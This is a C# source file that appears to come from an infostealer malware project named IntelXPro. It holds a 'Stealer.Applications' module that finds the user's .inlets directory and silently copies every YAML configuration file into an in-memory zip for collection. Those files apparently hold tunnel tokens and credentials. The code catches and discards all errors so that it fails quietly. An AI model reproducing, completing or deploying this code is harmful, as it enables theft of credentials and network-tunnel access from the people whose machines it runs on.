using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Inlets : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".inlets");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Inlets";

            bool foundData = false;

            if (Directory.Exists(userProfilePath))
            {
                try
                {
                    string[] yamlFiles = Directory.GetFiles(userProfilePath, "*.yaml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in yamlFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Inlets\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }

                    string[] ymlFiles = Directory.GetFiles(userProfilePath, "*.yml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in ymlFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Inlets\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
